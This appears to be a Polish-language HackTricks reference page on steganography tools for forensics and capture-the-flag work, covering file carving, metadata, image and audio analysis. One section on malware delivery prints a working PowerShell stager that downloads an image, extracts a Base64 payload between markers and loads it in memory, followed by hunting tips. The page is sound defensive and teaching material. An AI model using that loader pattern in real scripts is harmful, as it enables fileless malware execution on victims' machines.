# Stego Tricks

{{#include ../banners/hacktricks-training.md}}

## **Wyodrębnianie danych z plików**

### **Binwalk**

Narzędzie do przeszukiwania plików binarnych w poszukiwaniu osadzonych, ukrytych plików i danych. Jest instalowane za pomocą `apt`, a jego źródła są dostępne na [GitHub](https://github.com/ReFirmLabs/binwalk).
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

Odzyskuje pliki na podstawie ich nagłówków i stopek, przydatne dla obrazów png. Instalowany przez `apt`, źródła na [GitHub](https://github.com/korczis/foremost).
```bash
foremost -i file # Extracts data
```
### **Exiftool**

Pomaga przeglądać metadane plików, dostępne [here](https://www.sno.phy.queensu.ca/~phil/exiftool/).
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

Podobny do exiftool, służy do przeglądania metadanych. Można go zainstalować przez `apt`, źródła na [GitHub](https://github.com/Exiv2/exiv2), oraz ma [official website](http://www.exiv2.org/).
```bash
exiv2 file # Shows the metadata
```
### **File**

Zidentyfikuj typ pliku, z którym masz do czynienia.

### **Strings**

Wydobywa czytelne ciągi znaków z plików, używając różnych ustawień kodowania do filtrowania wyjścia.
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **Comparison (cmp)**

Przydatne do porównywania zmodyfikowanego pliku z jego oryginalną wersją znalezioną online.
```bash
cmp original.jpg stego.jpg -b -l
```
## **Wyodrębnianie ukrytych danych w tekście**

### **Ukryte dane w spacji**

Niewidoczne znaki w pozornie pustych miejscach mogą ukrywać informacje. Aby wyodrębnić te dane, odwiedź [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).

## **Wyodrębnianie danych z obrazów**

### **Identyfikacja szczegółów obrazu za pomocą GraphicMagick**

[GraphicMagick](https://imagemagick.org/script/download.php) służy do określania typów plików obrazów i wykrywania potencjalnych uszkodzeń. Wykonaj polecenie poniżej, aby sprawdzić obraz:
```bash
./magick identify -verbose stego.jpg
```
Aby spróbować naprawić uszkodzony obraz, dodanie komentarza metadata może pomóc:
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide do ukrywania danych**

Steghide umożliwia ukrywanie danych w plikach `JPEG, BMP, WAV, and AU`, potrafi wstawiać i wyodrębniać szyfrowane dane. Instalacja jest prosta przy użyciu `apt`, a jego [kod źródłowy jest dostępny na GitHub](https://github.com/StefanoDeVuono/steghide).

**Commands:**

- `steghide info file` ujawnia, czy plik zawiera ukryte dane.
- `steghide extract -sf file [--passphrase password]` wyodrębnia ukryte dane, hasło opcjonalne.

Do ekstrakcji przez przeglądarkę odwiedź [this website](https://futureboy.us/stegano/decinput.html).

**Atak brute-force z użyciem Stegcracker:**

- Aby spróbować złamać hasło w Steghide, użyj [stegcracker](https://github.com/Paradoxis/StegCracker.git) w następujący sposób:
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg dla plików PNG i BMP**

zsteg specjalizuje się w wykrywaniu ukrytych danych w plikach PNG i BMP. Instalacja odbywa się przez `gem install zsteg`, z jego [source on GitHub](https://github.com/zed-0xff/zsteg).

**Commands:**

- `zsteg -a file` applies all detection methods on a file.
- `zsteg -E file` specifies a payload for data extraction.

### **StegoVeritas i Stegsolve**

**stegoVeritas** sprawdza metadane, wykonuje transformacje obrazu i stosuje LSB brute forcing, między innymi. Użyj `stegoveritas.py -h` aby wyświetlić pełną listę opcji oraz `stegoveritas.py stego.jpg` aby przeprowadzić wszystkie sprawdzenia.

**Stegsolve** stosuje różne filtry kolorów, aby ujawnić ukryte teksty lub wiadomości w obrazach. Jest dostępny na [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve).

### **FFT do wykrywania ukrytej zawartości**

Techniki Fast Fourier Transform (FFT) mogą ujawnić ukrytą zawartość w obrazach. Przydatne zasoby obejmują:

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Stegpy dla plików audio i obrazów**

Stegpy umożliwia osadzanie informacji w plikach graficznych i audio, obsługując formaty takie jak PNG, BMP, GIF, WebP i WAV. Jest dostępny na [GitHub](https://github.com/dhsdshdhk/stegpy).

### **Pngcheck do analizy plików PNG**

Aby analizować pliki PNG lub zweryfikować ich autentyczność, użyj:
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **Dodatkowe narzędzia do analizy obrazów**

Do dalszej analizy warto odwiedzić:

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## Marker-delimited Base64 payloads hidden in images (malware delivery)

Commodity loaders coraz częściej ukrywają Base64-encoded payloads jako zwykły tekst wewnątrz pozornie poprawnych obrazów (często GIF/PNG). Zamiast LSB na poziomie pikseli, payload jest ograniczony przez unikalne łańcuchy znaczników start/koniec osadzone w tekście/metadanych pliku. Następnie stager PowerShell:

- Pobiera obraz przez HTTP(S)
- Wyszukuje łańcuchy znaczników (przykłady obserwowane: <<sudo_png>> … <<sudo_odt>>)
- Wydobywa tekst między znacznikami i dekoduje Base64 do bajtów
- Ładuje .NET assembly do pamięci i wywołuje znaną metodę wejściową (żaden plik nie jest zapisywany na dysku)

Minimalny PowerShell carving/loading snippet
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
Notatki
- To podlega pod ATT&CK T1027.003 (steganography). Ciągi markerów różnią się między kampaniami.
- Hunting: skanuj pobrane obrazy pod kątem znanych delimitatorów; oznacz `PowerShell` używający `DownloadString`, po którym następuje `FromBase64String`.

See also phishing delivery examples and full in-memory invocation flow here:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **Wyodrębnianie danych z plików audio**

**Audio steganography** oferuje unikalną metodę ukrywania informacji w plikach dźwiękowych. Do osadzania lub odzyskiwania ukrytej zawartości używa się różnych narzędzi.

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide to uniwersalne narzędzie przeznaczone do ukrywania danych w plikach JPEG, BMP, WAV i AU. Szczegółowe instrukcje znajdują się w [stego tricks documentation](stego-tricks.md#steghide).

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

To narzędzie jest zgodne z wieloma formatami, w tym PNG, BMP, GIF, WebP i WAV. Po więcej informacji odnieś się do [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav).

### **ffmpeg**

ffmpeg jest kluczowy do oceny integralności plików audio, dostarczając szczegółowych informacji i wskazując ewentualne rozbieżności.
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavSteg świetnie nadaje się do ukrywania i wydobywania danych w plikach WAV, wykorzystując strategię najmniej znaczącego bitu (least significant bit). Jest dostępny na [GitHub](https://github.com/ragibson/Steganography#WavSteg). Polecenia obejmują:
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Deepsound umożliwia szyfrowanie i wykrywanie informacji w plikach dźwiękowych przy użyciu AES-256. Można go pobrać z [the official page](http://jpinsoft.net/deepsound/download.aspx).

### **Sonic Visualizer**

Niezastąpione narzędzie do wizualnej i analitycznej inspekcji plików audio — Sonic Visualizer może ujawnić ukryte elementy niewykrywalne innymi metodami. Odwiedź [official website](https://www.sonicvisualiser.org/) aby uzyskać więcej informacji.

### **DTMF Tones - Dial Tones**

Wykrywanie tonów DTMF w plikach audio można przeprowadzić za pomocą narzędzi online, takich jak [this DTMF detector](https://unframework.github.io/dtmf-detect/) i [DialABC](http://dialabc.com/sound/detect/index.html).

## **Inne techniki**

### **Binary Length SQRT - QR Code**

Dane binarne, których długość ma całkowity pierwiastek kwadratowy, mogą reprezentować QR Code. Użyj tego fragmentu, aby to sprawdzić:
```python
import math
math.sqrt(2500) #50
```
Do konwersji binarnej na obraz sprawdź [dcode](https://www.dcode.fr/binary-image). Aby odczytać kody QR, użyj [this online barcode reader](https://online-barcode-reader.inliteresearch.com/).

### **Tłumaczenie Braille'a**

Do tłumaczenia Braille'a świetnym narzędziem jest [Branah Braille Translator](https://www.branah.com/braille-translator).

## **Referencje**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
